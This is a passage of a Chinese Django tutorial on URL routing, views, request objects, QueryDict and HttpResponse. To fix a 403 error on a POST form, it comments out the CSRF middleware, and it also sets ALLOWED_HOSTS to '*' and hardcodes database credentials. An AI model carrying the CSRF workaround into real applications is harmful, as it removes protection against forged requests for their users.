<h3 id="3-在-test3-settings-py-中-INSTALLED-APPS-项安装应用"><a href="#3-在-test3-settings-py-中-INSTALLED-APPS-项安装应用" class="headerlink" title="3. 在 test3/settings.py 中 INSTALLED_APPS 项安装应用"></a>3. 在 <code>test3/settings.py</code> 中 <code>INSTALLED_APPS</code> 项安装应用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">    &#x27;booktest&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="4-在-test3-settings-py-中-DATABASES-项配置使用-MySQL-数据库-test2"><a href="#4-在-test3-settings-py-中-DATABASES-项配置使用-MySQL-数据库-test2" class="headerlink" title="4. 在 test3/settings.py 中 DATABASES 项配置使用 MySQL 数据库 test2"></a>4. 在 <code>test3/settings.py</code> 中 DATABASES 项配置使用 MySQL 数据库 <code>test2</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">        &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,</span><br><span class="line">        &#x27;NAME&#x27;: &#x27;test2&#x27;,</span><br><span class="line">        &#x27;HOST&#x27;: &#x27;localhost&#x27;,</span><br><span class="line">        &#x27;PORT&#x27;: &#x27;3306&#x27;,</span><br><span class="line">        &#x27;USER&#x27;: &#x27;ckcat&#x27;,</span><br><span class="line">        &#x27;PASSWORD&#x27;: &#x27;mysql&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并在 <code>test/__init__.py</code> 中加入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pymysql</span><br><span class="line"></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>

<h3 id="5-在-test3-settings-py-中-TEMPLATES-项配置模板查找路径"><a href="#5-在-test3-settings-py-中-TEMPLATES-项配置模板查找路径" class="headerlink" title="5. 在 test3/settings.py 中 TEMPLATES 项配置模板查找路径"></a>5. 在 <code>test3/settings.py</code> 中 <code>TEMPLATES</code> 项配置模板查找路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;,</span><br><span class="line">        &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)],</span><br><span class="line">        &#x27;APP_DIRS&#x27;: True,</span><br><span class="line">        ...</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-创建模板目录-test3-templates-booktest-。"><a href="#6-创建模板目录-test3-templates-booktest-。" class="headerlink" title="6. 创建模板目录 test3/templates/booktest 。"></a>6. 创建模板目录 <code>test3/templates/booktest</code> 。</h3><h3 id="7-使用视图"><a href="#7-使用视图" class="headerlink" title="7. 使用视图"></a>7. 使用视图</h3><ol>
<li>在 <code>booktest/views.py</code> 中定义视图函数 index：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import render, HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">    return HttpResponse(&quot;视图函数Index&quot;)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在 <code>test3/urls.py</code> 中编辑加入如下代码：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import include, url</span><br><span class="line">from django.contrib import admin</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^admin/&#x27;, include(admin.site.urls)),</span><br><span class="line">    url(r&#x27;^&#x27;, include(&#x27;booktest.urls&#x27;))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>在 booktest 目录下创建 <code>urls.py</code> 文件并编辑其内容如下：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from booktest import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^$&#x27;, views.index)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="8-启动服务"><a href="#8-启动服务" class="headerlink" title="8. 启动服务"></a>8. 启动服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>

<h1 id="URLconf"><a href="#URLconf" class="headerlink" title="URLconf"></a>URLconf</h1><p>用户通过在浏览器的地址栏中输入网址请求网站，对于 Django 开发的网站，由哪一个视图进行处理请求，是由 url 匹配找到的。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="1-在-test3-settings-py-中通过-ROOT-URLCONF-指定-url-配置，默认已经有此配置。"><a href="#1-在-test3-settings-py-中通过-ROOT-URLCONF-指定-url-配置，默认已经有此配置。" class="headerlink" title="1. 在 test3/settings.py 中通过 ROOT_URLCONF 指定 url 配置，默认已经有此配置。"></a>1. 在 <code>test3/settings.py</code> 中通过 ROOT_URLCONF 指定 url 配置，默认已经有此配置。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROOT_URLCONF = &#x27;test3.urls&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="2-打开-test3-urls-py-可以看到默认配置。"><a href="#2-打开-test3-urls-py-可以看到默认配置。" class="headerlink" title="2. 打开 test3/urls.py 可以看到默认配置。"></a>2. 打开 <code>test3/urls.py</code> 可以看到默认配置。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import include, url</span><br><span class="line">from django.contrib import admin</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^admin/&#x27;, include(admin.site.urls)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><strong>注意点</strong></p>
<ul>
<li>在 <code>test3/urls.py</code> 中进行包含配置，在各自应用中创建具体配置。</li>
<li>定义 <code>urlpatterns</code> 列表，存储 <code>url()</code> 对象，这个名称是固定的。<blockquote>
<p>urlpatterns 中的每个正则表达式在第一次访问它们时被编译，这使得运行很快。</p>
</blockquote>
</li>
</ul>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><code>url()</code> 对象，被定义在 <code>django.conf.urls</code> 包中，有两种语法结构：</p>
<h3 id="语法一"><a href="#语法一" class="headerlink" title="语法一"></a>语法一</h3><p>包含，一般在自定义应用中创建一个 urls.py 来定义 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(正则,include(&#x27;应用.urls&#x27;))</span><br></pre></td></tr></table></figure>

<h3 id="语法二"><a href="#语法二" class="headerlink" title="语法二"></a>语法二</h3><p>定义，指定 URL 和视图函数的对应关系。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(正则,&#x27;视图函数名称&#x27;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明 1：正则部分推荐使用 r，表示字符串不转义，这样在正则表达式中使用\只写一个就可以。</p>
</blockquote>
<blockquote>
<p>说明 2：不能在开始加反斜杠，推荐在结束加反斜杠。</p>
</blockquote>
<h2 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h2><p>请求的 url 被看做是一个普通的 python 字符串，进行匹配时不包括域名、get 或 post 参数。 如请求地址如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/delete1/?a=10</span><br></pre></td></tr></table></figure>

<p>1）去除掉域名和参数部分，并将最前面的&#x2F;去除后，只剩下如下部分与正则匹配。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete1/</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，定义与这个地址匹配的 url 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^delete\d+/$&#x27;, views.show_args),</span><br></pre></td></tr></table></figure>

<p>3）在 booktest&#x2F;views.py 中创建视图 show_arg。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def show_args(request):</span><br><span class="line">    return HttpResponse(&#x27;show_args&#x27;)</span><br></pre></td></tr></table></figure>

<p>4）启动服务器，输入上面的网址，浏览器中效果如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-17-53-06.png" class="">

<p>可以在匹配过程中从 url 中捕获参数，每个捕获的参数都作为一个普通的 python 字符串传递给视图。</p>
<p>获取值需要在正则表达式中使用小括号，分为两种方式：</p>
<ul>
<li>位置参数</li>
<li>关键字参数</li>
</ul>
<blockquote>
<p>注意：两种参数的方式不要混合使用，在一个正则表达式中只能使用一种参数方式。</p>
</blockquote>
<h3 id="方式一：位置参数"><a href="#方式一：位置参数" class="headerlink" title="方式一：位置参数"></a>方式一：位置参数</h3><p>直接使用小括号，通过位置参数传递给视图。</p>
<p>1）为了提取参数，修改上面的正则表达式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^delete(\d+)/$&#x27;,views.show_args),</span><br></pre></td></tr></table></figure>

<p>2）修改视图 show_arg 如下：</p>
<blockquote>
<p>注意：参数的名字是任意的如 a1、b8，尽量做到见名知意。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def show_args(request,id):</span><br><span class="line">    return HttpResponse(&#x27;show args %s&#x27;%id)</span><br></pre></td></tr></table></figure>

<p>3）刷新浏览器页面，效果如下图：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-17-59-28.png" class="">

<h3 id="方式二：关键字参数"><a href="#方式二：关键字参数" class="headerlink" title="方式二：关键字参数"></a>方式二：关键字参数</h3><p>在正则表达式部分为组命名。</p>
<p>1）修改正则表达式如下：</p>
<blockquote>
<p>其中 <code>?P</code> 部分表示为这个参数定义的名称为 id ，可以是其它名称，起名做到见名知意。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^add(?P&lt;id1&gt;\d+)/&#x27;, views.show_arg),</span><br></pre></td></tr></table></figure>

<p>2）修改视图 show_arg 如下：</p>
<blockquote>
<p>注意：视图 show_arg 此时必须要有一个参数名为 id1，否则报错。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def show_arg(requset, id1):</span><br><span class="line">    return HttpResponse(&#x27;show_arg %s&#x27; % id1)</span><br></pre></td></tr></table></figure>

<p>3）刷新浏览器页面，效果如下图</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-20-39-52.png" class="">

<h1 id="视图-1"><a href="#视图-1" class="headerlink" title="视图"></a>视图</h1><p>视图就是 python 中的函数，视图一般被定义在”应用&#x2F;views.py”文件中，此例中为”booktest&#x2F;views.py”文件。视图必须返回一个 HttpResponse 对象或子对象作为响应。响应可以是一张网页的 HTML 内容，一个重定向，一个 404 错误等。</p>
<p>视图的第一个参数必须为 HttpRequest 实例，还可能包含下参数如：</p>
<ul>
<li>通过正则表达式组获得的关键字参数。</li>
<li>通过正则表达式组获取的位置参数。</li>
</ul>
<h2 id="内置错误视图"><a href="#内置错误视图" class="headerlink" title="内置错误视图"></a>内置错误视图</h2><p>Django 内置处理 HTTP 错误的视图，主要错误及视图包括：</p>
<ul>
<li>404 错误：page not found 视图</li>
<li>500 错误：server error 视图</li>
</ul>
<p>如果想看到错误视图而不是调试信息，需要修改 <code>test3/setting.py</code>文件的 DEBUG 项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEBUG = False</span><br><span class="line">ALLOWED_HOSTS = [&#x27;*&#x27;, ]</span><br></pre></td></tr></table></figure>

<h3 id="404-错误及视图"><a href="#404-错误及视图" class="headerlink" title="404 错误及视图"></a>404 错误及视图</h3><p>将请求地址进行 url 匹配后，没有找到匹配的正则表达式，则调用 404 视图，这个视图会调用 <code>404.html</code> 的模板进行渲染。视图传递变量 request_path 给模板，表示导致错误的 URL 。</p>
<p>1）在 templates 中创建 <code>404.html</code> 。</p>
<p>2）定义代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;404 Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">找不到了...</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>3）在浏览器中输入无效网址，效果如下：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-20-48-14.png" class="">

<h3 id="500-错误及视图"><a href="#500-错误及视图" class="headerlink" title="500 错误及视图"></a>500 错误及视图</h3><p>在视图中代码运行报错会发生 500 错误，调用内置错误视图，使用 <code>templates/500.html</code> 模板渲染。</p>
<h1 id="HttpReqeust-对象"><a href="#HttpReqeust-对象" class="headerlink" title="HttpReqeust 对象"></a>HttpReqeust 对象</h1><p>服务器接收到 http 协议的请求后，会根据报文创建 HttpRequest 对象，这个对象不需要我们创建，直接使用服务器构造好的对象就可以。<strong>视图的第一个参数必须是 HttpRequest 对象</strong>，在 django.http 模块中定义了 HttpRequest 对象的 API。</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><blockquote>
<p>下面除非特别说明，属性都是只读的。</p>
</blockquote>
<ul>
<li><p>path：一个字符串，表示请求的页面的完整路径，不包含域名和参数部分。</p>
</li>
<li><p>method：一个字符串，表示请求使用的 HTTP 方法，常用值包括：’GET’、’POST’。</p>
<ul>
<li>在浏览器中给出地址发出请求采用 get 方式，如超链接。</li>
<li>在浏览器中点击表单的提交按钮发起请求，如果表单的 method 设置为 post 则为 post 请求。</li>
</ul>
</li>
<li><p>encoding：一个字符串，表示提交的数据的编码方式。</p>
<ul>
<li>如果为 None 则表示使用浏览器的默认设置，一般为 utf-8。</li>
<li>这个属性是可写的，可以通过修改它来修改访问表单数据使用的编码，接下来对属性的任何访问将使用新的 encoding 值。</li>
</ul>
</li>
<li><p>GET：QueryDict 类型对象，类似于字典，包含 get 请求方式的所有参数。</p>
</li>
<li><p>POST：QueryDict 类型对象，类似于字典，包含 post 请求方式的所有参数。</p>
</li>
<li><p>FILES：一个类似于字典的对象，包含所有的上传文件。</p>
</li>
<li><p>COOKIES：一个标准的 Python 字典，包含所有的 cookie，键和值都为字符串。</p>
</li>
<li><p>session：一个既可读又可写的类似于字典的对象，表示当前的会话，只有当 Django 启用会话的支持时才可用，详细内容见”状态保持”。</p>
</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>接下来演示属性 path 、 method 、 encoding ，对于 GET 、 POST 、 FILES 、 COOKIES 、 session 后面会有详细讲解。</p>
<h3 id="path、encoding"><a href="#path、encoding" class="headerlink" title="path、encoding"></a>path、encoding</h3><p>1）打开 <code>booktest/views.py</code> 文件，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def index(request):</span><br><span class="line">    str=&#x27;%s,%s&#x27;%(request.path,request.encoding)</span><br><span class="line">    return render(request, &#x27;booktest/index.html&#x27;, &#123;&#x27;str&#x27;:str&#125;)</span><br></pre></td></tr></table></figure>

<p>2）在 <code>templates/booktest/</code> 下创建 <code>index.html</code> 文件，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">1. request对象的path,encoding属性：&lt;br/&gt;</span><br><span class="line">&#123;&#123; str &#125;&#125;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>3）打开浏览器请求，运行效果如下图：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-20-58-29.png" class="">

<h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>1）打开 <code>booktest/views.py</code> 文件，编写视图 method_show，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def method_show(request):</span><br><span class="line">    return HttpResponse(request.method)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，新增配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^method_show/$&#x27;, views.method_show),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code>下创建 <code>method_show.html</code> 文件，添加代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">2.request对象的method属性：&lt;br/&gt;</span><br><span class="line">&lt;a href=&#x27;/method_show/&#x27;&gt;get方式&lt;/a&gt;&lt;br/&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;/method_show/&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;post方式&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）打开浏览器请求，点击 “get 方式” 运行效果如下图：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-21-13-19.png" class="">
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-21-13-35.png" class="">

<ol start="5">
<li>回到 method_test 页面，点击按钮，转到 method_post，浏览效果如下图，报错了。</li>
</ol>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-21-15-00.png" class="">

<p>6）打开 <code>test3/settings.py</code> 文件，将 MIDDLEWARE_CLASSES 项的 csrf 注释。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">     #&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;, # 注释</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.SessionAuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>6）回到浏览器中点击 “post 方式”，浏览效果如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-21-17-57.png" class="">

<h2 id="QueryDict-对象"><a href="#QueryDict-对象" class="headerlink" title="QueryDict 对象"></a>QueryDict 对象</h2><ul>
<li>定义在 django.http.QueryDict</li>
<li>HttpRequest 对象的属性 GET、POST 都是 QueryDict 类型的对象</li>
<li>与 python 字典不同，QueryDict 类型的对象用来处理同一个键带有多个值的情况</li>
<li>方法 get()：根据键获取值</li>
<li>如果一个键同时拥有多个值将获取最后一个值</li>
<li>如果键不存在则返回 None 值，可以设置默认值进行后续处理</li>
<li>方法 getlist()：根据键获取值，值以列表返回，可以获取指定键的所有值</li>
<li>如果键不存在则返回空列表[]，可以设置默认值进行后续处理</li>
</ul>
<h2 id="GET-属性"><a href="#GET-属性" class="headerlink" title="GET 属性"></a>GET 属性</h2><p>请求格式：在请求地址结尾使用?，之后以”键&#x3D;值”的格式拼接，多个键值对之间以&amp;连接。</p>
<p>例：网址如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.itcast.cn/?a=10&amp;b=20&amp;c=python</span><br></pre></td></tr></table></figure>

<p>其中的请求参数为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=10&amp;b=20&amp;c=python</span><br></pre></td></tr></table></figure>

<ul>
<li>分析请求参数，键为’a’、’b’、’c’，值为’10’、’20’、’python’。</li>
<li>在 Django 中可以使用 HttpRequest 对象的 GET 属性获得 get 方方式请求的参数。</li>
<li>GET 属性是一个 QueryDict 类型的对象，键和值都是字符串类型。</li>
<li>键是开发人员在编写代码时确定下来的。</li>
<li>值是根据数据生成的。</li>
</ul>
<h2 id="POST-属性"><a href="#POST-属性" class="headerlink" title="POST 属性"></a>POST 属性</h2><p>使用 form 表单请求时，method 方式为 post 则会发起 post 方式的请求，需要使用 HttpRequest 对象的 POST 属性接收参数，POST 属性是一个 QueryDict 类型的对象。</p>
<p>问：表单 form 如何提交参数呢？</p>
<p>答：表单控件 name 属性的值作为键，value 属性的值为值，构成键值对提交。</p>
<ul>
<li>如果表单控件没有 name 属性则不提交。</li>
<li>对于 checkbox 控件，name 属性的值相同为一组，被选中的项会被提交，出现一键多值的情况。</li>
<li>键是表单控件 name 属性的值，是由开发人员编写的。</li>
<li>值是用户填写或选择的。</li>
</ul>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 show_reqarg 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#接收请求参数</span><br><span class="line">def show_reqarg(request):</span><br><span class="line">    if request.method == &#x27;GET&#x27;:</span><br><span class="line">        a = request.GET.get(&#x27;a&#x27;) #获取请求参数a</span><br><span class="line">        b = request.GET.get(&#x27;b&#x27;) #获取请求参数b</span><br><span class="line">        c = request.GET.get(&#x27;c&#x27;) #获取请求参数c</span><br><span class="line">        return render(request, &#x27;booktest/show_getarg.html&#x27;, &#123;&#x27;a&#x27;:a, &#x27;b&#x27;:b, &#x27;c&#x27;:c&#125;)</span><br><span class="line">    else:</span><br><span class="line">        name = request.POST.get(&#x27;uname&#x27;) #获取name</span><br><span class="line">        gender = request.POST.get(&#x27;gender&#x27;) #获取gender</span><br><span class="line">        hobbys = request.POST.getlist(&#x27;hobby&#x27;) #获取hobby</span><br><span class="line">        return render(request, &#x27;booktest/show_postarg.html&#x27;, &#123;&#x27;name&#x27;:name, &#x27;gender&#x27;:gender, &#x27;hobbys&#x27;:hobbys&#125;)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^show_reqarg/$&#x27;, views.show_reqarg),</span><br></pre></td></tr></table></figure>

<p>3）修改 <code>templates/booktest</code> 目录下的 <code>index.html</code> ，添加代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">3.提交数据的两种方式：</span><br><span class="line">get方式:&lt;br/&gt;</span><br><span class="line">&lt;a href=&quot;/show_reqarg/?a=1&amp;b=2&amp;c=python&quot;&gt;get方式提交数据&lt;/a&gt;&lt;br/&gt;</span><br><span class="line">post方式:&lt;br/&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;/show_reqarg/&quot;&gt;</span><br><span class="line">    姓名：&lt;input type=&quot;text&quot; name=&quot;uname&quot;&gt;&lt;br/&gt;</span><br><span class="line">    性别：男&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;男&quot;/&gt;</span><br><span class="line">    女&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;女&quot;/&gt;&lt;br/&gt;</span><br><span class="line">    爱好：</span><br><span class="line">    吃饭&lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;吃饭&quot;/&gt;</span><br><span class="line">    睡觉&lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;睡觉&quot;/&gt;</span><br><span class="line">    打豆豆&lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot; value=&quot;打豆豆&quot;/&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，浏览效果如下图：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-21-50-00.png" class="">

<p>5）在 <code>templates/booktest</code> 目录下创建 <code>show_getarg.html，show_postarg.html</code> ，代码如下:</p>
<p>show_getarg.html:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;GET方式提交数据&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">a:&#123;&#123; a &#125;&#125;&lt;br/&gt;</span><br><span class="line">b:&#123;&#123; b &#125;&#125;&lt;br/&gt;</span><br><span class="line">c:&#123;&#123; c &#125;&#125;&lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>show_postarg.html:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;POST方式提交数据&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">name:&#123;&#123; name &#125;&#125;&lt;br/&gt;</span><br><span class="line">gender:&#123;&#123; gender &#125;&#125;&lt;br/&gt;</span><br><span class="line">hobbys:</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for hobby in hobbys %&#125;</span><br><span class="line">        &lt;li&gt;&#123;&#123; hobby &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>6）点击链接 GET 方式提交数据，浏览效果如下图：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-21-52-51.png" class="">

<p>7）点击 POST 方式提交数据，浏览效果如下图：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-02-21-53-51.png" class="">

<h1 id="HttpResponse-对象"><a href="#HttpResponse-对象" class="headerlink" title="HttpResponse 对象"></a>HttpResponse 对象</h1><p>视图在接收请求并处理后，必须返回 HttpResponse 对象或子对象。在 <code>django.http</code> 模块中定义了 HttpResponse 对象的 API 。 HttpRequest 对象由 Django 创建，HttpResponse 对象由开发人员创建。</p>
<h2 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h2><ul>
<li><code>content</code>：表示返回的内容。</li>
<li><code>charset</code>：表示 response 采用的编码字符集，默认为 utf-8 。</li>
<li><code>status_code</code>：返回的 HTTP 响应状态码。</li>
<li><code>content-type</code>：指定返回数据的的 MIME 类型，默认为’text&#x2F;html’。</li>
</ul>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul>
<li><code>_init_</code>：创建 HttpResponse 对象后完成返回内容的初始化。</li>
<li><code>set_cookie</code>：设置 Cookie 信息。</li>
<li>cookie 是网站以键值对格式存储在浏览器中的一段纯文本信息，用于实现用户跟踪。<ul>
<li><code>max_age</code> 是一个整数，表示在指定秒数后过期。</li>
<li><code>expires</code> 是一个 datetime 或 timedelta l 对象，会话将在这个指定的日期&#x2F;时间过期。</li>
<li>max_age 与 expires 二选一。</li>
<li>如果不指定过期时间，在关闭浏览器时 cookie 会过期。</li>
</ul>
</li>
<li>delete_cookie(key)：删除指定的 key 的 Cookie，如果 key 不存在则什么也不发生。</li>
<li>write：向响应体中写数据。</li>
</ul>
